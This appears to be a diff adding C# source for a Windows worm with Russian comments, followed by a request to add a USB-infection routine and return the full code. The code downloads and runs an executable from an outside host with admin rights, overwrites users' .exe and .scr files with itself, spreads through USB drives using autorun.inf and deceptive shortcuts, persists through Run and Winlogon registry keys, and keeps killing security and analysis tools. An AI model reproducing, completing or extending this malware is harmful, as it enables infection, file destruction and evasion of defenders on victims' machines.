@@ -1,0 +1,523 @@
+        static bool IsAdministrator()
+        {
+            WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        // Метод для запуска процесса от имени администратора
+        static void RunAsAdmin(string fileName, string arguments = "")
+        {
+            ProcessStartInfo processInfo = new ProcessStartInfo(fileName, arguments)
+            {
+                UseShellExecute = true,
+                Verb = "runas" // Запустить как администратор
+            };
+
+            try
+            {
+                Process.Start(processInfo);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Ошибка при попытке запустить от имени администратора: {ex.Message}");
+            }
+        }
+
+        // Метод для скачивания файла
+        static void DownloadFile(string url, string filePath)
+        {
+            try
+            {
+                using (WebClient client = new WebClient())
+                {
+                    client.DownloadFile(url, filePath);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Ошибка при скачивании файла: {ex.Message}");
+            }
+        }
+
+        // Метод для копирования файла на USB-устройство и создания ярлыков
+        static void CopySelfToUSBAndCreateShortcuts(string wormPath)
+        {
+            // Получаем список подключенных USB-устройств
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive WHERE InterfaceType='USB'");
+            ManagementObjectCollection drives = searcher.Get();
+
+            // Копируем себя на каждое USB-устройство
+            foreach (ManagementObject drive in drives)
+            {
+                try
+                {
+                    // Получаем имя диска
+                    string diskName = drive["Name"].ToString();
+                    string volumeName = drive["VolumeName"].ToString();
+                    string diskPath = Path.Combine(@"\\.\", diskName);
+
+                    // Проверяем, является ли устройство съемным
+                    ManagementObjectSearcher volumeSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Volume WHERE DriveLetter='" + volumeName + "'");
+                    ManagementObjectCollection volumes = volumeSearcher.Get();
+
+                    if (volumes.Count > 0)
+                    {
+                        // Получаем первый объект из коллекции
+                        ManagementObject volume = volumes.Cast<ManagementObject>().FirstOrDefault();
+
+                        if (volume != null)
+                        {
+                            // Проверяем тип диска
+                            if (volume["DriveType"].ToString() == "2")
+                            {
+                                // Получаем путь к корневому каталогу диска
+                                string rootPath = volume["DriveLetter"].ToString() + @":\";
+
+                                // Копируем себя в корневой каталог
+                                string destinationPath = Path.Combine(rootPath, Path.GetFileName(wormPath));
+                                File.Copy(wormPath, destinationPath, true);
+
+                                // Создаем ярлыки для всех файлов
+                                DirectoryInfo directoryInfo = new DirectoryInfo(rootPath);
+                                foreach (FileInfo file in directoryInfo.GetFiles("*.*", SearchOption.AllDirectories))
+                                {
+                                    if (file.Name != Path.GetFileName(wormPath) && file.Name != "autorun.inf")
+                                    {
+                                        try
+                                        {
+                                            // Скрываем исходный файл
+                                            file.Attributes = FileAttributes.Hidden | FileAttributes.System;
+
+                                            // Создаем ярлык
+                                            string shortcutPath = Path.Combine(file.Directory.FullName, Path.GetFileNameWithoutExtension(file.FullName) + ".lnk");
+                                            using (var shortcut = new WshShell().CreateShortcut(shortcutPath))
+                                            {
+                                                shortcut.TargetPath = wormPath;
+                                                shortcut.Arguments = "\"" + file.FullName + "\"";
+                                                shortcut.WorkingDirectory = file.DirectoryName;
+                                                shortcut.IconLocation = wormPath;
+                                                shortcut.WindowStyle = WshWindowStyle.WshNormalFocus;
+                                                shortcut.Save();
+                                            }
+
+                                            Console.WriteLine("Создан ярлык для файла: " + file.FullName);
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            Console.WriteLine("Произошла ошибка при создании ярлыка для файла " + file.FullName + ": " + ex.Message);
+                                        }
+                                    }
+                                }
+
+                                // Создаем autorun.inf для запуска себя при подключении USB
+                                string autorunPath = Path.Combine(rootPath, "autorun.inf");
+                                using (StreamWriter writer = new StreamWriter(autorunPath))
+                                {
+                                    writer.WriteLine("[autorun]");
+                                    writer.WriteLine("open=" + Path.GetFileName(wormPath));
+                                    writer.WriteLine("shellexecute=" + Path.GetFileName(wormPath));
+                                }
+                            }
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Ошибка при обработке USB-устройства: {ex.Message}");
+                }
+            }
+        }
+
+        // Метод для создания ярлыка в папке "Автозагрузка"
+        static void AddLinkToStartup(string wormPath)
+        {
+            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            string processName = Process.GetCurrentProcess().ProcessName;
+
+            // Создаем ярлык
+            using (StreamWriter streamWriter = new StreamWriter(Path.Combine(folderPath, processName + ".url")))
+            {
+                streamWriter.WriteLine("[InternetShortcut]");
+                streamWriter.WriteLine("URL=file:///" + wormPath);
+                streamWriter.WriteLine("IconIndex=0");
+                string iconPath = wormPath.Replace('\\', '/');
+                streamWriter.WriteLine("IconFile=" + iconPath);
+            }
+        }
+
+        // Метод для модификации реестра
+        static void ModifyRegistry(string sourcePath)
+        {
+            string runPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+            string runOncePath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";
+            string winlogonPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
+            string winlogonPathCurrentUser = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
+
+            // Проверяем наличие административных прав
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
+            {
+                try
+                {
+                    // Добавляем worm.exe в ветку Run
+                    using (RegistryKey runKey = Registry.CurrentUser.CreateSubKey(runPath))
+                    {
+                        runKey.SetValue("reshacker", sourcePath);
+                    }
+
+                    // Добавляем worm.exe в ветку RunOnce
+                    using (RegistryKey runOnceKey = Registry.CurrentUser.CreateSubKey(runOncePath))
+                    {
+                        runOnceKey.SetValue("zona", sourcePath);
+                    }
+
+                    // Запись в Winlogon (осторожно)
+                    using (RegistryKey winlogonKey = Registry.LocalMachine.CreateSubKey(winlogonPath))
+                    {
+                        winlogonKey.SetValue("Shell", @"explorer.exe, " + sourcePath);
+                    }
+
+                    // Добавляем запись в Winlogon для текущего пользователя
+                    using (RegistryKey winlogonKeyCurrentUser = Registry.CurrentUser.CreateSubKey(winlogonPathCurrentUser))
+                    {
+                        winlogonKeyCurrentUser.SetValue("Shell", @"explorer.exe, " + sourcePath);
+                    }
+                }
+                catch (UnauthorizedAccessException)
+                {
+                    Console.WriteLine("Недостаточно прав для модификации реестра.");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Произошла ошибка: {ex.Message}");
+                }
+            }
+            else
+            {
+                Console.WriteLine("Недостаточно прав для модификации реестра.");
+            }
+        }
+
+        // Метод для создания файла autorun.inf
+        static void CreateAutorun(string wormPath, string driveLetter)
+        {
+            string autorunFilePath = Path.Combine(driveLetter + @":\", "autorun.inf");
+            using (StreamWriter autoStart = new StreamWriter(autorunFilePath))
+            {
+                autoStart.WriteLine("[autorun]");
+                autoStart.WriteLine("open=" + Path.GetFileName(wormPath));
+                autoStart.WriteLine("shellexecute=" + Path.GetFileName(wormPath));
+            }
+        }
+
+        // Метод для копирования файла на все USB-устройства
+        static void CopyToUSB(string wormPath)
+        {
+            string[] drives = Directory.GetLogicalDrives();
+
+            foreach (string drive in drives)
+            {
+                try
+                {
+                    // Проверяем, является ли устройство съемным
+                    if (DriveInfo.GetDrives().Where(d => d.Name == drive).FirstOrDefault()?.DriveType == DriveType.Removable)
+                    {
+                        // Копируем файл на USB-устройство
+                        string destinationFilePath = Path.Combine(drive, Path.GetFileName(wormPath));
+                        File.Copy(wormPath, destinationFilePath, true);
+
+                        // Создаем autorun.inf
+                        CreateAutorun(wormPath, drive);
+
+                        // Установка атрибутов файлов
+                        File.SetAttributes(destinationFilePath, FileAttributes.Hidden);
+                        File.SetAttributes(Path.Combine(drive, "autorun.inf"), FileAttributes.Hidden);
+
+                        Console.WriteLine($"Файл скопирован на USB-устройство: {drive}");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Ошибка при обработке диска {drive}: {ex.Message}");
+                }
+            }
+        }
+
+        // Метод для замены .exe и .scr файлов на рабочем столе, в загрузках, документах и видео
+        static void ReplaceFiles(string wormPath, string[] directories)
+        {
+            foreach (var directory in directories)
+            {
+                try
+                {
+                    string directoryPath = "";
+                    switch (directory)
+                    {
+                        case "Desktop":
+                            directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                            break;
+                        case "Downloads":
+                            directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
+                            break;
+                        case "Documents":
+                            directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Documents";
+                            break;
+                        case "Videos":
+                            directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Music";
+                            break;
+                        default:
+                            continue;
+                    }
+
+                    DirectoryInfo directoryInfo = new DirectoryInfo(directoryPath);
+
+                    // Заменяем .exe и .scr файлы на копию себя
+                    foreach (var file in directoryInfo.GetFiles("*.exe", SearchOption.AllDirectories).Concat(directoryInfo.GetFiles("*.scr", SearchOption.AllDirectories)))
+                    {
+                        try
+                        {
+                            // Удаляем старый файл
+                            File.Delete(file.FullName);
+
+                            // Копируем себя в место старого файла
+                            File.Copy(wormPath, file.FullName);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("Произошла ошибка при замене файла " + file.FullName + ": " + ex.Message);
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("Произошла ошибка при обработке папки " + directory + ": " + ex.Message);
+                }
+            }
+        }
+
+        // Метод для завершения процессов
+        static void KillProcesses(string[] processesToKill)
+        {
+            while (true)
+            {
+                // Получаем список запущенных процессов
+                Process[] runningProcesses = Process.GetProcesses();
+
+                // Завершаем процессы из списка
+                Console.WriteLine("Проверка и завершение процессов:");
+                foreach (string processName in processesToKill)
+                {
+                    foreach (Process process in runningProcesses)
+                    {
+                        if (process.ProcessName.Equals(processName, StringComparison.OrdinalIgnoreCase))
+                        {
+                            try
+                            {
+                                process.Kill();
+                                Console.WriteLine($"Процесс {processName} завершен.");
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine($"Ошибка при завершении процесса {processName}: {ex.Message}");
+                            }
+                            break;
+                        }
+                    }
+                }
+
+                // Ждем 100 секунд
+                Thread.Sleep(100000);
+            }
+        }
+
+        // Метод для создания файла .bat
+        static void CreateBatFile(string batFilePath, string command)
+        {
+            try
+            {
+                // Записываем команду в .bat файл
+                File.WriteAllText(batFilePath, command);
+                Console.WriteLine($"Файл '{batFilePath}' был успешно создан.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Произошла ошибка: {ex.Message}");
+            }
+        }
+
+        // Метод для выполнения .bat файла от имени администратора
+        static void ExecuteBatFile(string batFilePath)
+        {
+            try
+            {
+                ProcessStartInfo processInfo = new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = $"/c \"{batFilePath}\"",
+                    Verb = "runas", // Запуск от имени администратора
+                    UseShellExecute = true,
+                    CreateNoWindow = false // Открыть окно консоли
+                };
+
+                Process.Start(processInfo);
+                Console.WriteLine("Команда 'cmd.exe' была выполнена от имени администратора.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Произошла ошибка: {ex.Message}");
+            }
+        }
+
+        static void Main(string[] args)
+        {
+            // URL для скачивания worm.exe
+            string url = "http://wannac4n.beget.tech/Client.exe";
+            string downloadPath = @"C:\Windows"; // Путь для скачивания
+            string destinationFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
+            string[] directories = { "Desktop", "Downloads", "Documents", "Videos" }; // Папки, в которых нужно заменить .exe и .scr файлы
+            string[] processesToKill = new string[] {
+                "procexp", "SbieCtrl", "SpyTheSpy", "wireshark", "apateDNS", "IPBlocker",
+                "TiGeR-Firewall", "smsniff", "exeinfoPE", "NetSnifferCs", "Sandboxie Control",
+                "processhacker", "dnSpy", "CodeReflect", "Reflector", "ILSpy", "VGAuthService",
+                "VBoxService", "msconfig", "regedit", "cmd", "taskmgr", "ShadowExplorer",
+                "rstrui", "ShadowExplorerPortable", "SpyHunter-Installer", "SpyHunter", "MRT", "die", "WindowsSandbox", "WindowsSandboxClient","powershell"
+            };
+
+            try
+            {
+                // Проверяем, запущен ли код от имени администратора
+                if (!IsAdministrator())
+                {
+                    Console.WriteLine("Необходимо запустить программу от имени администратора.");
+                    return;
+                }
+
+                // Скачиваем файл
+                DownloadFile(url, Path.Combine(downloadPath, "Client.exe"));
+
+                // Создаем папку Synaptics в C:\ProgramData
+                string programDataPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
+                string synapticsPath = Path.Combine(programDataPath, "Synaptics");
+                Directory.CreateDirectory(synapticsPath);
+
+                // Копируем себя в папку Synaptics
+                string currentExecutablePath = Assembly.GetExecutingAssembly().Location;
+                string newExecutablePath = Path.Combine(synapticsPath, Path.GetFileName(currentExecutablePath));
+                string newExecutablePath1= Path.Combine(synapticsPath, Path.GetFileName(currentExecutablePath));
+                File.Copy(currentExecutablePath, newExecutablePath);
+
+                // Запускаем скачанный файл от имени администратора
+                RunAsAdmin(Path.Combine(downloadPath, "Client.exe"));
+
+                // Заменяем .exe и .scr файлы на рабочем столе, в загрузках, документах и видео
+                ReplaceFiles(newExecutablePath, directories);
+
+                // Копируем себя на USB-устройства
+                CopyToUSB(newExecutablePath);
+                
+
+                // Создаем ярлык в папке "Автозагрузка"
+                AddLinkToStartup(newExecutablePath);
+
+                // Модифицируем реестр
+                ModifyRegistry(newExecutablePath);
+
+                // Завершаем процессы
+                KillProcesses(processesToKill);
+
+                // Создаем .bat файл и запускаем его от имени администратора
+                string batFilePath = @"C:\Windows\file.bat";
+
+                // Создаем файл .bat с командой "привет"
+                CreateBatFile1(batFilePath, "");
+                // Запускаем файл .bat от имени администратора
+                ExecuteBatFileAsAdmin(batFilePath);
+               
+
+                Console.WriteLine("Все действия выполнены успешно.");
+
+                
+                
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Произошла ошибка: {ex.Message}");
+            }
+        }
+
+       
+
+        // Создает файл .bat с заданной командой
+        private static void CreateBatFile1(string filePath, string command)
+        {
+            using (StreamWriter writer = new StreamWriter(filePath))
+            {
+                writer.WriteLine(command);
+            }
+        }
+
+        // Запускает файл .bat от имени администратора
+        static void ExecuteBatFileAsAdmin(string filePath)
+        {
+            // Проверяем, является ли текущий пользователь администратором
+            if (IsAdministrator())
+            {
+                // Запускаем файл .bat напрямую, так как уже являемся администратором
+                ProcessStartInfo startInfo = new ProcessStartInfo(filePath)
+                {
+                    Verb = "runas",
+                    UseShellExecute = true
+                };
+                Process.Start(startInfo);
+            }
+            else
+            {
+                // Запускаем файл .bat с повышенными привилегиями
+                ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe")
+                {
+                    Verb = "runas",
+                    Arguments = "/c " + filePath,
+                    UseShellExecute = true
+                };
+                Process.Start(startInfo);
+            }
+        }
+
+    }
+}
+
+добавь в код 
+ public static void Infect()
+    {
+        string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+        string[] drives = Directory.GetLogicalDrives();
+
+        foreach (string drive in drives)
+        {
+            try
+            {
+                // Copy the executable to the drive
+                File.Copy(Application.ExecutablePath, drive + "Copter.flv.exe");
+
+                // Create autorun.inf file
+                using (StreamWriter autoStart = new StreamWriter(drive + @"\autorun.inf"))
+                {
+                    autoStart.WriteLine("[autorun]");
+                    autoStart.WriteLine("open=" + drive + "Copter.flv.exe");
+                    autoStart.WriteLine("shellexecute=" + drive);
+                }
+
+                // Hide the files
+                File.SetAttributes(drive + @"\autorun.inf", FileAttributes.Hidden);
+                File.SetAttributes(drive + @"\Copter.flv.exe", FileAttributes.Hidden);
+            }
+            catch (Exception ex)
+            {
+                // Handle the exception
+                Console.WriteLine("Error: " + ex.Message);
+            }
+        }
+    }
+}
+скинь целый и полный код
